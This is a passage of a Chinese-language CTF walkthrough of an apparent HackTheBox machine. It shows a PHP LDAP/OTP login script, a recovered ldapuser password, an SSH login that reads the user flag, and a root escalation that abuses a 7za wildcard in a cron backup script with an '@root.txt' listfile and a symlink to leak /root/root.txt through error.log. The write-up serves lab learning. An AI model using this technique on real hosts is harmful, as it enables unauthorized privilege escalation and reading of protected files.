                print "Could not set LDAPv3rn";
            }
            else if (!ldap_start_tls($ds)) {
               print "Could not start secure TLS connection";
            }
            else {
                // now we need to bind to the ldap server
                $bth = ldap_bind($ds, $dn, $password) or die("rnCould not connect to LDAP serverrn");
                $filter = "(&(objectClass=inetOrgPerson)(uid=$username2))";
                // fix to be sure that the user has a token string in the db. Without it you can bypass the OTP check with no token in the input form!
                $filter = "(&(&(objectClass=inetOrgPerson)(uid=$username2))(pager=*))";
                //echo $filter.PHP_EOL;
                if ($search=@ldap_search($ds, $basedn, $filter)) {
                    $info = ldap_get_entries($ds, $search);
                    if($info["count"] > 0) {
                        $token_string = $info[0]['pager'][0];
                        //echo $token_string;
                        $token = exec("/usr/bin/stoken --token=$token_string --pin=0000");
                        if($token == $OPT1) {
                            $strErrorMsg = "Login ok";
                            $_SESSION['username'] = $username1;
                            header ('Location: /page.php');
                        }
                        else {
                            $strErrorMsg = "Cannot login";
                        }
                    }
                    else {
                        $strErrorMsg = "User $username1 not found";
                    }
                }
            }
        }
    }
    ?>
得到一组用户名和密码
    $username = 'ldapuser';
    $password = 'e398e27d5c4ad45086fe431120932a01';
SSH登陆后可以获取到user的flag
    root@kali:~# ssh PI:EMAIL
    The authenticity of host '10.10.10.122 (10.10.10.122)' can't be established.
    ECDSA key fingerprint is SHA256:N1/2S6I/kcd5HDQzbSvAZVI7yHQQgz+XmLdhk6yVHh4.
    Are you sure you want to continue connecting (yes/no)? yes
    Warning: Permanently added '10.10.10.122' (ECDSA) to the list of known hosts.
    PI:EMAIL's password:
    [ldapuser@ctf ~]$ ls
    user.txt
    [ldapuser@ctf ~]$ cat user.txt
    74a8exxxxxxxxxxxxxxxx4ee585
## Wildcard提权
在根目录发现一个`backup`文件夹，存放了一些备份文件，sh脚本和error日志
    [ldapuser@ctf backup]$ ls
    backup.1564391941.zip  backup.1564392121.zip  backup.1564392301.zip  backup.1564392481.zip  honeypot.sh
    backup.1564392001.zip  backup.1564392181.zip  backup.1564392361.zip  backup.1564392541.zip
    backup.1564392061.zip  backup.1564392241.zip  backup.1564392421.zip  error.log
**honeypot.sh**
    # get banned ips from fail2ban jails and update banned.txt
    # banned ips directily via firewalld permanet rules are **not** included in the list (they get kicked for only 10 seconds)
    /usr/sbin/ipset list | grep fail2ban -A 7 | grep -E '[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}' | sort -u > /var/www/html/banned.txt
    # awk '$1=$1' ORS='' /var/www/html/banned.txt > /var/www/html/testfile.tmp && mv /var/www/html/testfile.tmp /var/www/html/banned.txt
    # some vars in order to be sure that backups are protected
    now=$(date +"%s")
    filename="backup.$now"
    pass=$(openssl passwd -1 -salt 0xEA31 -in /root/root.txt | md5sum | awk '{print $1}')
    # keep only last 10 backups
    cd /backup
    ls -1t *.zip | tail -n +11 | xargs rm -f
    # get the files from the honeypot and backup 'em all
    cd /var/www/html/uploads
    7za a /backup/$filename.zip -t7z -snl -p$pass -- *
    # cleaup the honeypot
    rm -rf -- *
    # comment the next line to get errors for debugging
    truncate -s 0 /backup/error.log
脚本用于更新被ban的IP，定期备份`/var/www/html/uploads`中的文件，使用7za进行压缩后保存到`/backup`中，同时将报错信息保存到`/backup/error.log`，注意到压缩包的密码生成过程，读取到`root.txt`，因此这个定时任务的权限为root。
重点关注7za压缩的命令，其中使用了`*`通配符，可以考虑[Exploiting Wildcard for Privilege
Escalation](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)
    7za a /backup/$filename.zip -t7z -snl -p$pass -- *
其中使用了`-snl`，查看help
    -snl : store symbolic links as links
我们可以通过软链接把`/root/root.txt`链接到`/var/www/html/uploads/root.txt`，不过由于密码不知道，唯一办法就是导致7za报错，把保存信息输出到`error.log`
这里需要使用7za读取listfiles的特性
    Usage: 7za  [...]  [...]
           []
例如`7za a backup.zip -t7z [@listfile](https://github.com/listfile
"@listfile").txt`，其中`listfile.txt`内容为`/tmp/*.zip`，那么7za会把`/tmp`中所有后缀是`.zip`压缩到`backup.zip`，如果找到到指定后缀的文件，将会产生报错信息。
总结一下思路：  
1.在uploads新建一个`[@root](https://github.com/root "@root").txt`  
2.将`/root/root.txt`软链接到`/var/www/html/uploads/root.txt`  
3.7za压缩时，由于通配符的原因，`[@root](https://github.com/root
"@root").txt`被7za当成listfiles读取，而upload中不存在root.txt内容为扩展名的文件，将产生报错，内容写入error.log
查看一下`uploads`的权限为apache，需要使用之前的命令执行界面进行新建文件
    [ldapuser@ctf html]$ ls -al
    total 36
    drwxr-xr-x. 6 root   root    176 Oct 23  2018 .
    drwxr-xr-x. 4 root   root     33 Jun 27  2018 ..
    -rw-r--r--. 1 root   root      0 Jul 30 03:48 banned.txt
    -rw-r-----. 1 root   apache 1424 Oct 23  2018 cover.css
    drwxr-x--x. 2 root   apache 4096 Oct 23  2018 css
    drwxr-x--x. 4 root   apache   27 Oct 23  2018 dist
    -rw-r-----. 1 root   apache 2592 Oct 23  2018 index.html
    drwxr-x--x. 2 root   apache  242 Oct 23  2018 js
    -rw-r-----. 1 root   apache 5021 Oct 23  2018 login.php
    -rw-r-----. 1 root   apache   68 Oct 23  2018 logout.php
    -rw-r-----. 1 root   apache 5245 Oct 23  2018 page.php
    -rw-r-----. 1 root   apache 2324 Oct 23  2018 status.php
    drwxr-x--x. 2 apache apache    6 Oct 23  2018 uploads
等待定时任务执行，`tail -f`监控`error.log`文件
    [ldapuser@ctf backup]$ tail -f error.log
    WARNING: No more files
    fd6dxxxxxxxxxxxxxxxxxxx40c79ba053
    tail: error.log: file truncated
日常维护钟，管理员编写运维脚本都喜欢使用通配符，往往导致一些安全问题，这个技巧在日常渗透测试，非常实用，值得学习一下。